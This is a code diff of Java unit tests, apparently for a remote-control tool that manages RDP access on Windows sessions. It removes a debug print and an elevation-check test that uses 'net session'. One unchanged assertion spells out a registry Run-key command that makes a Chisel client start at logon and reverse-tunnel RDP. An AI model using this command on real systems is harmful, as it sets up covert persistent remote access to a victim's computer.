@@ -66,7 +66,6 @@ class WindowsRDPStandalone {
 		
 		@Override
 		public void run() {
-			System.out.println("Starting runner");
 			while(alive) {
 				String command = session.pollCommand(sessionId);
 				if(command == null) {
@@ -257,20 +256,7 @@ class WindowsRDPStandalone {
 		assertTrue(fourthCommand.equals("reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Chisel /t REG_SZ /d \"%APPDATA%\\nw_helper\\chisel.exe client 127.0.0.1:48002 R:48001:127.0.0.1:3389\""));
 	}
 
-	@Test
-	void testIsClientElevated() {
-		WindowsRDPManager rdp = new WindowsRDPManager(io, 48000, 10, io.getCommandPreprocessor());
-		io.sendIO(sessionId, "Access is denied.");
-		assertFalse(rdp.isClientElevated(sessionId));
-		io.sendIO(sessionId, "There are no entries in the list.");
-		assertTrue(rdp.isClientElevated(sessionId));
-
-		// Flush commands
-		String out = io.pollCommand(sessionId);
-		assertEquals(out, "net session 2>&1");
-		out = io.pollCommand(sessionId);
-		assertEquals(out, "net session 2>&1");
-	}
+	
 
 	@Test
 	void testValidateClientRDPEnabled() {
